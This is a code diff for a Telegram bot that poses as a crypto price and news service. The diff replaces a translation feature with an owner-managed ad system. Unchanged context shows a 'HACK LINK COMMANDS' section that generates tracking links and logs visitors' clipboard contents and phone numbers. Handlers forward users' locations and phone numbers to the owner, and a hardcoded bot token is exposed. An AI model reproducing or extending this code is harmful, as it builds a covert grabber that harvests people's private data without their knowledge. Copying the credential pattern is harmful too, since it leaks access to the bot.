@@ -12,48 +12,12 @@ import threading
 import matplotlib.pyplot as plt
 from io import BytesIO
 from apscheduler.schedulers.background import BackgroundScheduler
-from googletrans import Translator
 
 # ==================== CONFIG ====================
 BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"
 OWNER_ID = 6504476778
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
-translator = Translator()
-
-# ==================== LANGUAGE SUPPORT ====================
-user_language = {}  # {user_id: 'en'/'hi'/'hinglish'}
-
-def get_user_lang(user_id):
-    return user_language.get(user_id, 'en')
-
-def set_user_lang(user_id, lang):
-    user_language[user_id] = lang
-
-def translate_text(text, dest_lang):
-    try:
-        return translator.translate(text, dest=dest_lang).text
-    except:
-        return text
-
-def t(text, user_id, lang=None):
-    if lang is None:
-        lang = get_user_lang(user_id)
-    if lang == 'hi':
-        return translate_text(text, 'hi')
-    elif lang == 'hinglish':
-        hinglish_map = {
-            "Bitcoin": "Bitcoin",
-            "price": "price",
-            "market cap": "market cap",
-            "up": "up",
-            "down": "down",
-            "Please try again": "फिर से कोशिश करें",
-            "Success": "सफलता"
-        }
-        return hinglish_map.get(text, text)
-    else:
-        return text
 
 # ==================== DATABASE ====================
 DB_PATH = 'bot.db'
@@ -66,6 +30,7 @@ def get_db():
 def init_db():
     conn = get_db()
     c = conn.cursor()
+    # Users table
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY,
                   username TEXT,
@@ -74,6 +39,7 @@ def init_db():
                   phone TEXT,
                   location TEXT,
                   language TEXT DEFAULT 'en')''')
+    # Links table
     c.execute('''CREATE TABLE IF NOT EXISTS links
                  (link_id TEXT PRIMARY KEY,
                   user_id INTEGER,
@@ -81,6 +47,7 @@ def init_db():
                   modified_url TEXT,
                   created_at TEXT,
                   clicks INTEGER DEFAULT 0)''')
+    # Clicks table
     c.execute('''CREATE TABLE IF NOT EXISTS clicks
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   link_id TEXT,
@@ -96,10 +63,12 @@ def init_db():
                   clipboard TEXT,
                   phone TEXT,
                   timestamp TEXT)''')
+    # Coins supply cache
     c.execute('''CREATE TABLE IF NOT EXISTS coins
                  (symbol TEXT PRIMARY KEY,
                   supply REAL,
                   last_updated TIMESTAMP)''')
+    # Price alerts
     c.execute('''CREATE TABLE IF NOT EXISTS alerts
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   user_id INTEGER,
@@ -107,6 +76,16 @@ def init_db():
                   target_price REAL,
                   is_above BOOLEAN,
                   created_at TIMESTAMP)''')
+    # Ads table
+    c.execute('''CREATE TABLE IF NOT EXISTS ads
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  button_text TEXT,
+                  link TEXT,
+                  photo_file_id TEXT,
+                  duration_minutes INTEGER,
+                  created_at TIMESTAMP,
+                  expires_at TIMESTAMP,
+                  is_active BOOLEAN DEFAULT 1)''')
     conn.commit()
     conn.close()
     print("✅ Database ready")
@@ -269,6 +248,18 @@ def check_alerts():
 
 scheduler.add_job(check_alerts, 'interval', minutes=5)
 
+# ==================== ADS SCHEDULER ====================
+def check_expired_ads():
+    conn = get_db()
+    c = conn.cursor()
+    now = datetime.datetime.now()
+    c.execute("UPDATE ads SET is_active=0 WHERE expires_at < ? AND is_active=1", (now,))
+    conn.commit()
+    conn.close()
+    print("✅ Expired ads deactivated")
+
+scheduler.add_job(check_expired_ads, 'interval', minutes=1)
+
 # ==================== LIVE MARKET DATA ====================
 TOP_COINS = [
     ('BTC', 'bitcoin'),
@@ -377,6 +368,15 @@ def is_premium(user_id):
             return True
     return False
 
+# ==================== GET ACTIVE AD ====================
+def get_active_ad():
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT * FROM ads WHERE is_active=1 ORDER BY created_at DESC LIMIT 1")
+    ad = c.fetchone()
+    conn.close()
+    return ad
+
 # ==================== START MENU ====================
 def main_menu():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
@@ -456,17 +456,17 @@ def callback_handler(call):
     if call.data == "back_main":
         bot.edit_message_text("Main Menu", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
     elif call.data == "price_btc":
-        simple_price(call.message, 'BTC')
+        price_with_ads(call.message, 'BTC', 'bitcoin')
     elif call.data == "price_eth":
-        simple_price(call.message, 'ETH')
+        price_with_ads(call.message, 'ETH', 'ethereum')
     elif call.data == "price_doge":
-        simple_price(call.message, 'DOGE')
+        price_with_ads(call.message, 'DOGE', 'dogecoin')
     elif call.data == "live_market":
         live_market_command(call.message)
     elif call.data == "alert_menu":
-        bot.send_message(call.message.chat.id, t("🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", call.from_user.id), parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, "🔔 *Set Price Alert*\nSend: /coin:alert_BTC_price 65000", parse_mode="Markdown")
     elif call.data == "graph_menu":
-        bot.send_message(call.message.chat.id, t("📊 *Price Graph*\nUse: /price_btc, /price_eth, /price_doge", call.from_user.id), parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, "📊 *Price Graph*\nUse: /price_btc, /price_eth, /price_doge", parse_mode="Markdown")
     elif call.data == "news":
         news_command(call.message)
     elif call.data == "gen_link":
@@ -486,48 +486,108 @@ def callback_handler(call):
                 del active_live_updates[call.from_user.id]
         bot.edit_message_text("⏹️ Live updates stopped.", call.message.chat.id, call.message.message_id)
         bot.answer_callback_query(call.id, "Updates stopped.")
+    elif call.data == "manage_ads":
+        if call.from_user.id != OWNER_ID:
+            bot.answer_callback_query(call.id, "❌ Only owner can manage ads")
+            return
+        manage_ads_command(call.message)
+    elif call.data.startswith("ad_extend_"):
+        if call.from_user.id != OWNER_ID:
+            bot.answer_callback_query(call.id, "❌ Only owner")
+            return
+        ad_id = int(call.data.split("_")[2])
+        bot.send_message(call.message.chat.id, f"Send new duration in minutes for ad #{ad_id}:")
+        bot.register_next_step_handler(call.message, extend_ad, ad_id)
+    elif call.data.startswith("ad_stop_"):
+        if call.from_user.id != OWNER_ID:
+            bot.answer_callback_query(call.id, "❌ Only owner")
+            return
+        ad_id = int(call.data.split("_")[2])
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("UPDATE ads SET is_active=0 WHERE id=?", (ad_id,))
+        conn.commit()
+        conn.close()
+        bot.answer_callback_query(call.id, "✅ Ad stopped")
+        bot.send_message(call.message.chat.id, f"Ad #{ad_id} stopped.")
+    elif call.data.startswith("ad_delete_"):
+        if call.from_user.id != OWNER_ID:
+            bot.answer_callback_query(call.id, "❌ Only owner")
+            return
+        ad_id = int(call.data.split("_")[2])
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("DELETE FROM ads WHERE id=?", (ad_id,))
+        conn.commit()
+        conn.close()
+        bot.answer_callback_query(call.id, "✅ Ad deleted")
+        bot.send_message(call.message.chat.id, f"Ad #{ad_id} deleted.")
+    elif call.data == "refresh_ads":
+        if call.from_user.id != OWNER_ID:
+            bot.answer_callback_query(call.id, "❌ Only owner")
+            return
+        manage_ads_command(call.message)
 
-# ==================== SIMPLE PRICE COMMANDS ====================
-def simple_price(message, coin):
-    data = get_market_data(coin, coin.lower())
+# ==================== PRICE WITH ADS ====================
+def price_with_ads(message, coin_symbol, coin_api_name):
+    data = get_market_data(coin_symbol, coin_api_name)
     if not data:
-        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
+        bot.reply_to(message, "❌ Data unavailable.")
         return
+    
     price_str = format_price(data['price'])
+    cap_str = format_market_cap(data['market_cap'])
+    
     msg = f"""
 ╔══════════════════════╗
-║    *{coin} PRICE*     ║
+║    *{coin_symbol} PRICE*    ║
 ╠══════════════════════╣
-║  💰 {price_str}         ║
+║  💰 {price_str}          ║
+║  📊 Market Cap: {cap_str} ║
 ╚══════════════════════╝
     """
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    
+    # Create markup
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    
+    # If user is not premium, add ad
+    if not is_premium(message.from_user.id):
+        ad = get_active_ad()
+        if ad:
+            # Ad button
+            ad_button = types.InlineKeyboardButton(ad['button_text'], url=ad['link'])
+            markup.add(ad_button)
+            # Remove ads button
+            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
+            markup.add(remove_ads)
+    
+    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=markup if markup.keyboard else None)
 
 @bot.message_handler(commands=['btc'])
-def btc_simple(message):
-    simple_price(message, 'BTC')
+def btc_command(message):
+    price_with_ads(message, 'BTC', 'bitcoin')
 
 @bot.message_handler(commands=['eth'])
-def eth_simple(message):
-    simple_price(message, 'ETH')
+def eth_command(message):
+    price_with_ads(message, 'ETH', 'ethereum')
 
 @bot.message_handler(commands=['doge'])
-def doge_simple(message):
-    simple_price(message, 'DOGE')
+def doge_command(message):
+    price_with_ads(message, 'DOGE', 'dogecoin')
 
 # ==================== PRICE WITH GRAPH ====================
 @bot.message_handler(commands=['price_btc'])
 def price_btc_graph(message):
     data = get_market_data('BTC', 'bitcoin')
     if not data:
-        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
+        bot.reply_to(message, "❌ Data unavailable.")
         return
     
     loading = bot.reply_to(message, "⏳ *Generating chart...*", parse_mode="Markdown")
     
     img = generate_price_chart('BTC', 7)
     if not img:
-        bot.edit_message_text(t("❌ Chart generation failed.", message.from_user.id), loading.chat.id, loading.message_id)
+        bot.edit_message_text("❌ Chart generation failed.", loading.chat.id, loading.message_id)
         return
     
     caption = f"""
@@ -535,8 +595,21 @@ def price_btc_graph(message):
 💰 Price: ${data['price']:,.2f}
 📊 Market Cap: {format_market_cap(data['market_cap'])}
     """
+    
+    # For chart, we send as photo, so we can add ad as separate message after photo
     bot.send_photo(message.chat.id, img, caption=caption, parse_mode="Markdown")
     bot.delete_message(loading.chat.id, loading.message_id)
+    
+    # If not premium, send ad as separate message
+    if not is_premium(message.from_user.id):
+        ad = get_active_ad()
+        if ad:
+            markup = types.InlineKeyboardMarkup()
+            ad_button = types.InlineKeyboardButton(ad['button_text'], url=ad['link'])
+            markup.add(ad_button)
+            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
+            markup.add(remove_ads)
+            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)
 
 # ==================== LIVE MARKET COMMAND ====================
 @bot.message_handler(commands=['live:all_cryptos'])
@@ -544,10 +617,23 @@ def live_market_command(message):
     wait_msg = bot.reply_to(message, "⏳ *Fetching live market data...*", parse_mode="Markdown")
     coins = get_all_market_data(limit=7)
     if not coins:
-        bot.edit_message_text(t("❌ Market data unavailable.", message.from_user.id), wait_msg.chat.id, wait_msg.message_id)
+        bot.edit_message_text("❌ Market data unavailable.", wait_msg.chat.id, wait_msg.message_id)
         return
     msg = format_market_message(coins)
+    
+    # For live market, we can add ad after the message
     bot.edit_message_text(msg, wait_msg.chat.id, wait_msg.message_id, parse_mode='Markdown', reply_markup=stop_button_markup())
+    
+    if not is_premium(message.from_user.id):
+        ad = get_active_ad()
+        if ad:
+            markup = types.InlineKeyboardMarkup()
+            ad_button = types.InlineKeyboardButton(ad['button_text'], url=ad['link'])
+            markup.add(ad_button)
+            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
+            markup.add(remove_ads)
+            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)
+    
     with live_update_lock:
         active_live_updates[message.from_user.id] = {
             'chat_id': message.chat.id,
@@ -560,53 +646,21 @@ def live_market_command(message):
 def alert_command(message):
     parts = message.text.split()
     if len(parts) < 2:
-        bot.reply_to(message, t("Usage: /coin:alert_BTC_price 65000", message.from_user.id))
+        bot.reply_to(message, "Usage: /coin:alert_BTC_price 65000")
         return
     try:
         cmd_parts = parts[0].split('_')
         coin = cmd_parts[2]
         target = float(parts[1])
     except:
-        bot.reply_to(message, t("Invalid format. Use: /coin:alert_BTC_price 65000", message.from_user.id))
+        bot.reply_to(message, "Invalid format. Use: /coin:alert_BTC_price 65000")
         return
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("⬆️ Above", callback_data=f"alert_set_{coin}_above_{target}"),
         types.InlineKeyboardButton("⬇️ Below", callback_data=f"alert_set_{coin}_below_{target}")
     )
-    bot.reply_to(message, t(f"Set alert for {coin} at ${target}:", message.from_user.id), reply_markup=markup)
-
-# ==================== LANGUAGE COMMAND ====================
-@bot.message_handler(commands=['language'])
-def language_command(message):
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, t("Usage: /language [en/hi/hinglish]", message.from_user.id))
-        return
-    lang = parts[1].lower()
-    if lang in ['en', 'hi', 'hinglish']:
-        set_user_lang(message.from_user.id, lang)
-        bot.reply_to(message, t(f"Language set to {lang}", message.from_user.id))
-    else:
-        bot.reply_to(message, t("Supported languages: en, hi, hinglish", message.from_user.id))
-
-# ==================== GROUP SUMMARY ====================
-@bot.message_handler(commands=['group_summary'])
-def group_summary(message):
-    coins = get_all_market_data(limit=10)
-    if not coins:
-        bot.reply_to(message, t("❌ Data unavailable.", message.from_user.id))
-        return
-    top = max(coins, key=lambda x: abs(x['change']))
-    direction = "🟢 up" if top['change'] >= 0 else "🔴 down"
-    msg = f"""
-📊 *Today's Top Mover*
-━━━━━━━━━━━━━━━━━━━━━
-{top['symbol']} is {direction} {abs(top['change']):.2f}%!
-Current Price: {format_price(top['price'])}
-━━━━━━━━━━━━━━━━━━━━━
-    """
-    bot.reply_to(message, msg, parse_mode="Markdown")
+    bot.reply_to(message, f"Set alert for {coin} at ${target}:", reply_markup=markup)
 
 # ==================== NEWS ====================
 def get_crypto_news():
@@ -626,6 +680,16 @@ def news_command(message):
         msg += f"{i}. {n}\n"
     msg += "━━━━━━━━━━━━━━━━━━━━━"
     bot.reply_to(message, msg, parse_mode="Markdown")
+    
+    if not is_premium(message.from_user.id):
+        ad = get_active_ad()
+        if ad:
+            markup = types.InlineKeyboardMarkup()
+            ad_button = types.InlineKeyboardButton(ad['button_text'], url=ad['link'])
+            markup.add(ad_button)
+            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
+            markup.add(remove_ads)
+            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup)
 
 # ==================== HACK LINK COMMANDS ====================
 @bot.message_handler(func=lambda m: m.text == "🔗 GENERATE LINK" or m.text == "/terminal:gernatLINK")
@@ -658,6 +722,17 @@ def gen_link(message):
 ━━━━━━━━━━━━━━━━━━━━━
     """
     bot.send_message(message.chat.id, design_msg, parse_mode="Markdown", reply_markup=markup)
+    
+    # Show ad if free user
+    if not premium:
+        ad = get_active_ad()
+        if ad:
+            markup_ad = types.InlineKeyboardMarkup()
+            ad_button = types.InlineKeyboardButton(ad['button_text'], url=ad['link'])
+            markup_ad.add(ad_button)
+            remove_ads = types.InlineKeyboardButton("⭐ Remove Ads", callback_data="subscription")
+            markup_ad.add(remove_ads)
+            bot.send_message(message.chat.id, "📢 *Sponsored Message*", reply_markup=markup_ad)
 
 @bot.callback_query_handler(func=lambda call: call.data == "enter_link")
 def ask_link(call):
@@ -672,7 +747,7 @@ def ask_link(call):
 def process_link(message):
     url = message.text.strip()
     if not (url.startswith('http://') or url.startswith('https://')):
-        bot.reply_to(message, t("❌ *Invalid Link!*\nMust start with http:// or https://", message.from_user.id), parse_mode="Markdown")
+        bot.reply_to(message, "❌ *Invalid Link!*\nMust start with http:// or https://", parse_mode="Markdown")
         return
     loading = bot.reply_to(message, "⏳ *Generating your secure link...*", parse_mode="Markdown")
     frames = [
@@ -737,6 +812,133 @@ def copy_link(call):
         bot.send_message(call.message.chat.id, f"📋 *Your Link:*\n`{row[0]}`", parse_mode="Markdown")
     else:
         bot.answer_callback_query(call.id, "❌ Link not found")
+
+# ==================== OWNER ADS COMMANDS ====================
+@bot.message_handler(commands=['createad'])
+def create_ad_start(message):
+    if message.from_user.id != OWNER_ID:
+        bot.reply_to(message, "❌ Only owner can use this command.")
+        return
+    msg = bot.reply_to(message, "📝 Send me the **button text** for the ad (e.g., 'Offers Click Now'):", parse_mode="Markdown")
+    bot.register_next_step_handler(msg, create_ad_button_text)
+
+def create_ad_button_text(message):
+    button_text = message.text.strip()
+    msg = bot.reply_to(message, "🔗 Send me the **link** for the ad (e.g., https://example.com):", parse_mode="Markdown")
+    bot.register_next_step_handler(msg, create_ad_link, button_text)
+
+def create_ad_link(message, button_text):
+    link = message.text.strip()
+    if not link.startswith(('http://', 'https://')):
+        bot.reply_to(message, "❌ Invalid link. Must start with http:// or https://. Try again from /createad.")
+        return
+    msg = bot.reply_to(message, "🖼️ Send me a **photo** for the ad (optional, send /skip to skip):", parse_mode="Markdown")
+    bot.register_next_step_handler(msg, create_ad_photo, button_text, link)
+
+def create_ad_photo(message, button_text, link):
+    if message.text and message.text == "/skip":
+        photo_file_id = None
+        bot.reply_to(message, "⏱️ Send me the **duration in minutes** for the ad (e.g., 60 for 1 hour):")
+        bot.register_next_step_handler(message, create_ad_duration, button_text, link, photo_file_id)
+    elif message.photo:
+        photo_file_id = message.photo[-1].file_id
+        bot.reply_to(message, "⏱️ Send me the **duration in minutes** for the ad (e.g., 60 for 1 hour):")
+        bot.register_next_step_handler(message, create_ad_duration, button_text, link, photo_file_id)
+    else:
+        bot.reply_to(message, "❌ Please send a photo or /skip. Try again from /createad.")
+        return
+
+def create_ad_duration(message, button_text, link, photo_file_id):
+    try:
+        duration = int(message.text.strip())
+        if duration <= 0:
+            raise ValueError
+    except:
+        bot.reply_to(message, "❌ Invalid duration. Must be a positive number. Try again from /createad.")
+        return
+    
+    created_at = datetime.datetime.now()
+    expires_at = created_at + datetime.timedelta(minutes=duration)
+    
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('''INSERT INTO ads (button_text, link, photo_file_id, duration_minutes, created_at, expires_at, is_active)
+                 VALUES (?, ?, ?, ?, ?, ?, 1)''',
+              (button_text, link, photo_file_id, duration, created_at, expires_at))
+    conn.commit()
+    ad_id = c.lastrowid
+    conn.close()
+    
+    bot.reply_to(message, f"✅ Ad created successfully!\nID: {ad_id}\nExpires at: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}")
+
+@bot.message_handler(commands=['manageads'])
+def manage_ads_command(message):
+    if message.from_user.id != OWNER_ID:
+        bot.reply_to(message, "❌ Only owner can use this command.")
+        return
+    
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT * FROM ads ORDER BY created_at DESC")
+    ads = c.fetchall()
+    conn.close()
+    
+    if not ads:
+        bot.send_message(message.chat.id, "📭 No ads found.")
+        return
+    
+    for ad in ads:
+        status = "🟢 Active" if ad['is_active'] else "🔴 Inactive"
+        expiry = ad['expires_at'][:19] if ad['expires_at'] else "N/A"
+        text = f"ID: {ad['id']}\nButton: {ad['button_text']}\nLink: {ad['link']}\nDuration: {ad['duration_minutes']} min\nExpires: {expiry}\nStatus: {status}"
+        
+        markup = types.InlineKeyboardMarkup(row_width=3)
+        if ad['is_active']:
+            markup.add(
+                types.InlineKeyboardButton("⏱️ Extend", callback_data=f"ad_extend_{ad['id']}"),
+                types.InlineKeyboardButton("⏹️ Stop", callback_data=f"ad_stop_{ad['id']}"),
+                types.InlineKeyboardButton("🗑️ Delete", callback_data=f"ad_delete_{ad['id']}")
+            )
+        else:
+            markup.add(
+                types.InlineKeyboardButton("🗑️ Delete", callback_data=f"ad_delete_{ad['id']}")
+            )
+        
+        if ad['photo_file_id']:
+            bot.send_photo(message.chat.id, ad['photo_file_id'], caption=text, reply_markup=markup)
+        else:
+            bot.send_message(message.chat.id, text, reply_markup=markup)
+    
+    # Refresh button
+    refresh_markup = types.InlineKeyboardMarkup()
+    refresh_markup.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="refresh_ads"))
+    bot.send_message(message.chat.id, "Use buttons above to manage ads. Click Refresh to update list.", reply_markup=refresh_markup)
+
+def extend_ad(message, ad_id):
+    try:
+        minutes = int(message.text.strip())
+        if minutes <= 0:
+            raise ValueError
+    except:
+        bot.reply_to(message, "❌ Invalid duration. Please send a positive number.")
+        return
+    
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT expires_at FROM ads WHERE id=?", (ad_id,))
+    row = c.fetchone()
+    if not row:
+        bot.reply_to(message, "❌ Ad not found.")
+        conn.close()
+        return
+    
+    current_expiry = datetime.datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S.%f')
+    new_expiry = current_expiry + datetime.timedelta(minutes=minutes)
+    c.execute("UPDATE ads SET expires_at=?, is_active=1 WHERE id=?", (new_expiry, ad_id))
+    conn.commit()
+    conn.close()
+    
+    bot.reply_to(message, f"✅ Ad #{ad_id} extended by {minutes} minutes. New expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}")
 
 # ==================== BALANCE, INFO, SUBSCRIPTION, HISTORY ====================
 @bot.message_handler(func=lambda m: m.text == "💰 BALANCE")
@@ -872,7 +1074,7 @@ def handle_location(message):
     conn.commit()
     conn.close()
     bot.send_message(OWNER_ID, f"📍 Location from {message.from_user.id}: {lat},{lon}")
-    bot.reply_to(message, t("✅ Location received! Thank you.", message.from_user.id))
+    bot.reply_to(message, "✅ Location received! Thank you.")
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
@@ -886,7 +1088,7 @@ def handle_contact(message):
     conn.commit()
     conn.close()
     bot.send_message(OWNER_ID, f"📞 Phone from {message.from_user.id}: {phone}")
-    bot.reply_to(message, t("✅ Phone number received! Thank you.", message.from_user.id))
+    bot.reply_to(message, "✅ Phone number received! Thank you.")
 
 # ==================== TRACKING HTML ====================
 TRACKING_HTML = '''
